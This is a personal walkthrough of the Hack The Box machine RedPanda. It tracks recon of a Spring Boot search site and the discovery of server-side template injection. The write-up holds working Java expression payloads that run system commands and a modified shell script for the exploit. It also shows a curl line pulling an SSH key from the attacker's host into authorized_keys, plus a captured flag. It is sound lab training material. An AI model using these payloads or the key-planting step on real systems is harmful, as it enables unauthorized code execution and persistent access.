# [01 - RedPanda](https://app.hackthebox.com/machines/RedPanda)

## description
> 10.129.193.227

![RedPanda.png](RedPanda.png)

## walkthrough

### recon

```
$ nmap -sV -sC -A -Pn -p- redpanda.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-10 10:45 MDT
Nmap scan report for redpanda.htb (10.129.193.227)
Host is up (0.061s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Sun, 10 Jul 2022 16:45:43 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Sun, 10 Jul 2022 16:45:43 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sun, 10 Jul 2022 16:45:43 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1></body></html>
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Red Panda Search | Made with Spring Boot

```


### 8080

```
POST /search HTTP/1.1
Host: redpanda.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://redpanda.htb:8080
Connection: close
Referer: http://redpanda.htb:8080/
Upgrade-Insecure-Requests: 1

name=red+panda
```

interestingly, 404 response for `favicon.ico` was MIME-type JSON:
```
HTTP/1.1 404
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Content-Type: application/json
Date: Sun, 10 Jul 2022 16:47:03 GMT
Connection: close
Content-Length: 113

{"timestamp":"2022-07-10T16:47:03.858+00:00","status":404,"error":"Not Found","message":"","path":"/favicon.ico"}
```

gobuster or sqlmap?

does ther fact that this is powered by springboot push us in one direction or the other?

sqlmap didn't find anything

gobuster found 2 new routes using `common.txt`
```
/error                (Status: 500) [Size: 86]
/search               (Status: 405) [Size: 117]
/stats                (Status: 200) [Size: 987]
```

/error is a whitelabel endpoint, so.. stats it is.

```
Please choose an author to view statistics for

woodenk

damian

With every view an author gets for their red panda image, they are awarded with 1 creditpoint. These eventually lead up to a bigger payout bonus for their content
```


http://redpanda.htb:8080/stats?author=woodenk

gives us
```
woodenk

Panda URI 	Panda views
/img/greg.jpg 	0
/img/hungy.jpg 	0
/img/smooch.jpg 	0
/img/smiley.jpg 	0
Total views: 0

Export table
```

and

```
damian
Panda URI 	Panda views
/img/angy.jpg 	0
/img/shy.jpg 	0
/img/crafty.jpg 	0
/img/peter.jpg 	0
Total views: 0
```

the export table link points at `http://redpanda.htb:8080/export.xml?author=damian`

raw wget of export.xml gives
```
$ cat export.xml
Error, incorrect paramenter 'author'
```

`http://redpanda.htb:8080/img/angy.jpg` is indeed a picture of a red panda


gobuster vhost looking for subdomains

```
Found: gc._msdcs (Status: 400) [Size: 435]
Found: _domainkey (Status: 400) [Size: 435]
Found: mailing._domainkey.sunnynews (Status: 400) [Size: 435]
Found: mailing._domainkey.info (Status: 400) [Size: 435]
Found: hallam_dev (Status: 400) [Size: 435]
Found: hallam_ad (Status: 400) [Size: 435]
Found: wm_j_b__ruffin (Status: 400) [Size: 435]
Found: 2609_n_www (Status: 400) [Size: 435]
Found: 0907_n_hn.m (Status: 400) [Size: 435]
Found: 0507_n_hn (Status: 400) [Size: 435]
Found: faitspare_mbp.cit (Status: 400) [Size: 435]
Found: sb_0601388345bc6cd8 (Status: 400) [Size: 435]
Found: sb_0601388345bc450b (Status: 400) [Size: 435]
Found: api_portal_dev (Status: 400) [Size: 435]
Found: api_web_dev (Status: 400) [Size: 435]
Found: api_webi_dev (Status: 400) [Size: 435]
Found: sklep_test (Status: 400) [Size: 435]
```

a lot of those look like garbage, but `api_portal_dev` and `api_web_dev` look like they might be real

back to search - searched with `name=`, and got

```
You searched for: Greg
There are 1 results for your search
Panda name:
Greg
Panda bio:
Greg is a hacker. Watch out for his injection attacks!
```

so, search for the filenames without extension
`hungy`

'greg' seems to be the only result with a relevant bio - given that it is pointing at injection, going back to sqlmap


while waiting for `--level 3` scans to complete, trying to figure out why the stats page isn't being updated as expected.

```
$ curl -X POST http://redpanda.htb:8080/stats?author=damian -d '{"uri":"/img/angy.jpg"}'
{"timestamp":"2022-07-10T17:45:18.181+00:00","status":405,"error":"Method Not Allowed","message":"","path":"/stats"}
```

### back again

wrote [caller.rb](caller.rb) to see if there were other names we were missing,
```
$ ruby caller.rb
total names[18240]
name[angy] found
name[peter] found
name[greg] found
```

didn't find anything new.

POSTing `/search name=greg%2526shards%3Dhttp%3A%2F%2F10.129.192.103%2Fsolr` afer reading [https://github.com/veracode-research/solr-injection](https://github.com/veracode-research/solr-injection), [specifically](https://github.com/veracode-research/solr-injection#black-box-detection)

and got a different response
> You searched for: Error occured: banned characters


so without `%`, can't think of any encoding attacks, which pushes us back to SQLi.

quick segue to SSTI, but tplmap comes up empty
```
$ tplmap.py -u http://redpanda.htb:8080/export.xml?author=foo
Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

Testing if GET parameter 'author' is injectable
Smarty plugin is testing rendering with tag '*'
Smarty plugin is testing blind injection
Mako plugin is testing rendering with tag '${*}'
Mako plugin is testing blind injection
Python plugin is testing rendering with tag 'str(*)'
Python plugin is testing blind injection
Tornado plugin is testing rendering with tag '{{*}}'
Tornado plugin is testing blind injection
Jinja2 plugin is testing rendering with tag '{{*}}'
Jinja2 plugin is testing blind injection
Twig plugin is testing rendering with tag '{{*}}'
Twig plugin is testing blind injection
Exiting: 'bool' object has no attribute 'replace'
```

same for `http://redpanda.htb:8080/stats?author=foo`. try POST on /search?

worth a shot, but no luck `-u http://redpanda.htb:8080/search -X POST -d 'name=foo'`

still feels like ssti is the path forward. reading forum, confirmed.

### ssti

eventually got to `#{7*7}`, which returned `You searched for: ??49_en_US??`

`#{{7*7}}` gets to `You searched for: ??{7*7}_en_US??`, so still leaking data, but not actually what we're looking for

```
$ curl http://redpanda.htb:8080/search -X POST -d 'name=@{7*7}'
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Red Panda Search | Made with Spring Boot</title>
    <link rel="stylesheet" href="css/search.css">
  </head>
  <body>
    <form action="/search" method="POST">
    <div class="wrap">
      <div class="search">
        <input type="text" name="name" placeholder="Search for a red panda">
        <button type="submit" class="searchButton">
          <i class="fa fa-search"></i>
        </button>
      </div>
    </div>
  </form>
    <div class="wrapper">
  <div class="results">
    <h2 class="searched">You searched for: 49</h2>
      <h2>There are 0 results for your search</h2>

    </div>
    </div>

  </body>
</html>
```

so an `@{}` wrapped query is getting only what we want, no `_en_us`

we can make '+' math work by encoding `+` ourselves, otherwise it is interpreted as a space

but beyond basic math, can't get anything to work - and tplmap is empty even with `--level 5`.. which makes this feel like a very specific templating engine

```
$ curl http://redpanda.htb:8080/search -X POST --data-raw 'name=#{T()}'
...
    <h2 class="searched">You searched for: #{T()}</h2>
      <h2>There are 0 results for your search</h2>
```
no injection

```
$ curl http://redpanda.htb:8080/search -X POST --data-raw 'name=#{{T()}}'
...
    <h2 class="searched">You searched for: ??{T()}_en_US??</h2>
      <h2>There are 0 results for your search</h2>
```

if not injection, at least modification

```
$ curl http://redpanda.htb:8080/search -X POST --data-raw 'name=#{{7*7}}'
...
    <h2 class="searched">You searched for: ??{7*7}_en_US??</h2>
      <h2>There are 0 results for your search</h2>
```

so not injection

```
$ curl http://redpanda.htb:8080/search -X POST --data-raw 'name=#{7*7}'
    <h2 class="searched">You searched for: ??49_en_US??</h2>
      <h2>There are 0 results for your search</h2>
```
injection



need to figure out what the engine is before continuing to shoot in the dark

### coming back

took down trick this morning, trying to ride that.

still need to identify the engine - searching just "spring boot ssti", the first link is for [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

this identifies 5 different expression types:
```
${...}: Variable expressions – in practice, these are OGNL or Spring EL expressions.
*{...}: Selection expressions – similar to variable expressions but used for specific purposes.
#{...}: Message (i18n) expressions – used for internationalization.
@{...}: Link (URL) expressions – used to set correct URLs/paths in the application.
~{...}: Fragment expressions – they let you reuse parts of templates.
```

and we can get `*`, `#` and `@` prefixed simple `{8*8}` expressions to work for all of them


[https://www.baeldung.com/spring-template-engines](https://www.baeldung.com/spring-template-engines):
> as well as the main template engines that can be used with Spring: Thymeleaf, Groovy, FreeMarker, Jade.

interesting that didn't mention `Expression Language EL`, because from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection),
> Expression Language EL - Basic injection
> ${1+1}
> #{1+1}


wrote [searcher.rb](searcher.rb) and populated with more PATT content in [sstis](sstis)

while playing with `def exploder()`, go to `Jinjava`, which

```
[38] pry(main)> search("*{{'a'.toUpperCase()}}")
=> "A"
```

finally something more powerful than arithmetic

```
[39] pry(main)> search("*{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}")
=> {"timestamp"=>"2022-07-17T19:02:16.906+00:00", "status"=>500, "error"=>"Internal Server Error", "message"=>"", "path"=>"/search"}
[40] pry(main)> search("*{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}")
=> "xxx"
```

we're definitely executing java, not javascript, as proven by:
```
[81] pry(main)> search("*{{'fooo'.charCodeAt(3)}}")
=> {"timestamp"=>"2022-07-17T19:19:27.860+00:00", "status"=>500, "error"=>"Internal Server Error", "message"=>"", "path"=>"/search"}
[82] pry(main)> search("*{{'fooo'.charAt(3)}}")
=> "o"
```

`charAt` => Java, `charCodeAt` => JavaScript


and finally, get to [https://github.com/VikasVarshney/ssti-payload](https://github.com/VikasVarshney/ssti-payload), which gets us to

```
[120] pry(main)> search('%24%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%28119%29.concat%28T%28java.lang.Character%29.toString%28104%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28109%29%29.concat%28T%28java.lang.Character%29.toString%28105%29%29%29.getInputStream%28%29%29%7D')
=> "Error occured: banned characters"
[121] pry(main)> 0x24.chr
=> "$"
[122] pry(main)> '*'.ord.to_s(16)
=> "2a"
[123] pry(main)> search('%2A%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%28119%29.concat%28T%28java.lang.Character%29.toString%28104%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28109%29%29.concat%28T%28java.lang.Character%29.toString%28105%29%29%29.getInputStream%28%29%29%7D')

From: /home/conor/git/ctf-meta/htb/machines/03-RedPanda/searcher.rb:32 Object#search:

    16: def search(term)
    17:   uri = URI.parse(BASE_URL)
    18:
    19:   http = Net::HTTP.new(uri.host, uri.port)
    20:
    21:   request = Net::HTTP::Post.new(uri.request_uri)
    22:   request.body = sprintf('name=%s', term)
    23:   request['Content-Type'] = 'application/x-www-form-urlencoded'
    24:
    25:   response = http.request(request)
    26:
    27:   if response.code.eql?('200')
    28:     if response.body.match(RESPONSE_MATCHER)
    29:       return $1
    30:     end
    31:
 => 32:     binding.pry
    33:   else
    34:     return JSON.parse(response.body)
    35:   end
    36:
    37:   binding.pry
    38: end

[1] pry(main)> response.body
=> "<!DOCTYPE html>\n<html lang=\"en\" dir=\"ltr\">\n  <head>\n    <meta charset=\"utf-8\">\n    <title>Red Panda Search | Made with Spring Boot</title>\n    <link rel=\"stylesheet\" href=\"css/search.css\">\n  </head>\n  <body>\n    <form action=\"/search\" method=\"POST\">\n    <div class=\"wrap\">\n      <div class=\"search\">\n        <input type=\"text\" name=\"name\" placeholder=\"Search for a red panda\">\n        <button type=\"submit\" class=\"searchButton\">\n          <i class=\"fa fa-search\"></i>\n        </button>\n      </div>\n    </div>\n  </form>\n    <div class=\"wrapper\">\n  <div class=\"results\">\n    <h2 class=\"searched\">You searched for: woodenk\n</h2>\n      <h2>There are 0 results for your search</h2>\n       \n    </div>\n    </div>\n    \n  </body>\n</html>\n"
```

output that matters `You searched for: woodenk\n`, this was an encoded `whoami` command

```
$ python ssti-payload.py -u
Command ==> cat /home/woodenk/user.txt

%24%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%2899%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28104%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%28109%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28119%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%28100%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28110%29%29.concat%28T%28java.lang.Character%29.toString%28107%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28117%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28114%29%29.concat%28T%28java.lang.Character%29.toString%2846%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%28120%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29%29.getInputStream%28%29%29%7D
```

which gets us to..

`<h2 class="searched">You searched for: 324c9fbcbc65d4032c4bda715a4955dc`

awwwwwww yeah.


now to pop a shell. this is a pain.

2 minor modifications to `ssti-skel.py`, and
```
$ gd
diff --git a/ssti-skel.py b/ssti-skel.py
index ab1d2d1..f6c7661 100644
--- a/ssti-skel.py
+++ b/ssti-skel.py
@@ -36,7 +36,7 @@ class Terminal(Cmd):
                for i in command:
                        decimals.append(str(ord(i)))

-               payload='''${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
+               payload='''*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]


                for i in decimals[1:]:
@@ -63,7 +63,7 @@ class Terminal(Cmd):
                headers = {} #This usually has to be added but there is a Burp extension to convert burp headers into python request headers.
                debug('Headers: ',str(headers))
                try:
-                       response=requests.get(url, headers=headers)
+                       response=requests.post(url, headers=headers)
                        output=response.text
                        #The next line is used to parse out the output, this might be clean but it also may need work. Depends on the vuln.


```


```
[21:20:41] ==> mkdir /home/woodenk/.ssh
[21:20:41] ==> ls -la /home/woodenk/.ssh
[21:20:41] ==> curl http://10.10.14.9:8000/redpanda.pub -o /home/woodenk/.ssh/authorized_keys
```

and..

```
$ ssh -l woodenk -i redpanda redpanda.htb
Warning: Permanently added 'redpanda.htb,10.10.11.170' (ECDSA) to the list of known hosts.
woodenk@redpanda.htb's password:
```

even after making it `0600`, and `chgrp woodenk`, still no love

ok, sticking with this shell for now.

```
[21:20:41] ==> ps aux
root         611  0.0  0.8 214660 17996 ?        SLsl Jul16   0:08 /sbin/multipathd -d -s
systemd+     632  0.0  0.2  90872  6088 ?        Ssl  Jul16   0:06 /lib/systemd/systemd-timesyncd
root         647  0.0  0.5  47540 10712 ?        Ss   Jul16   0:00 /usr/bin/VGAuthService
root         649  0.0  0.4 311504  8404 ?        Ssl  Jul16   1:24 /usr/bin/vmtoolsd
root         664  0.0  0.2  99896  5744 ?        Ssl  Jul16   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         683  0.0  0.4 239292  9328 ?        Ssl  Jul16   0:01 /usr/lib/accountsservice/accounts-daemon
message+     684  0.0  0.2   7380  4432 ?        Ss   Jul16   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         707  0.0  0.1  81956  3852 ?        Ssl  Jul16   0:03 /usr/sbin/irqbalance --foreground
root         708  0.0  0.4 236436  9072 ?        Ssl  Jul16   0:00 /usr/lib/policykit-1/polkitd --no-debug
syslog       716  0.0  0.2 224344  5136 ?        Ssl  Jul16   0:00 /usr/sbin/rsyslogd -n -iNONE
root         722  0.0  0.2  17124  5932 ?        Ss   Jul16   0:00 /lib/systemd/systemd-logind
root         726  0.0  0.6 395484 13548 ?        Ssl  Jul16   0:00 /usr/lib/udisks2/udisksd
root         749  0.0  0.6 318816 13448 ?        Ssl  Jul16   0:00 /usr/sbin/ModemManager
systemd+     813  0.0  0.6  24696 13128 ?        Ss   Jul16   0:10 /lib/systemd/systemd-resolved
root         856  0.0  0.1   6812  3056 ?        Ss   Jul16   0:00 /usr/sbin/cron -f
root         860  0.0  0.1   8356  3356 ?        S    Jul16   0:00 /usr/sbin/CRON -f
daemon       861  0.0  0.1   3792  2300 ?        Ss   Jul16   0:00 /usr/sbin/atd -f
root         862  0.0  0.0   2608   592 ?        Ss   Jul16   0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         863  0.0  0.2   9420  4588 ?        S    Jul16   0:00 sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         869  0.0  0.3  12172  7336 ?        Ss   Jul16   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
woodenk      871  0.2 13.0 3112828 265508 ?      Sl   Jul16   3:12 java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         882  0.0  0.0   5828  1848 tty1     Ss+  Jul16   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
mysql        912  0.1 21.7 1819240 442252 ?      Ssl  Jul16   2:48 /usr/sbin/mysqld
root        1742  0.0  0.0      0     0 ?        I    Jul16   0:23 [kworker/0:0-events]
root       12297  0.0  0.0      0     0 ?        I    10:28   0:27 [kworker/0:1-events]
root       17359  0.0  0.0      0     0 ?        I    16:39   0:02 [kworker/1:2-events]
root       20591  0.0  0.0      0     0 ?        I    20:23   0:00 [kworker/u4:0-events_power_efficient]
root       21104  0.0  0.0      0     0 ?        I    21:00   0:00 [kworker/u4:1-events_power_efficient]
root       21253  0.0  0.0      0     0 ?        I    21:10   0:00 [kworker/1:1-events]
root       21526  0.0  0.0      0     0 ?        I    21:28   0:00 [kworker/u4:2-events_power_efficient]
woodenk    21529  0.0  0.1   8888  3248 ?        R    21:28   0:00 ps aux
```

grab the jar and reverse it?

```
[21:20:41] ==> ls -la /opt
drwxr-xr-x  5 root root 4096 Jun 23 18:12 .
drwxr-xr-x 20 root root 4096 Jun 23 14:52 ..
-rwxr-xr-x  1 root root  462 Jun 23 18:12 cleanup.sh
drwxr-xr-x  3 root root 4096 Jun 14 14:35 credit-score
drwxr-xr-x  6 root root 4096 Jun 14 14:35 maven
drwxrwxr-x  5 root root 4096 Jun 14 14:35 panda_search
</h2>
```

hmm - is `credit-score` another site? what's `cleanup.sh`?

## flag

```
user:324c9fbcbc65d4032c4bda715a4955dc
root:
```
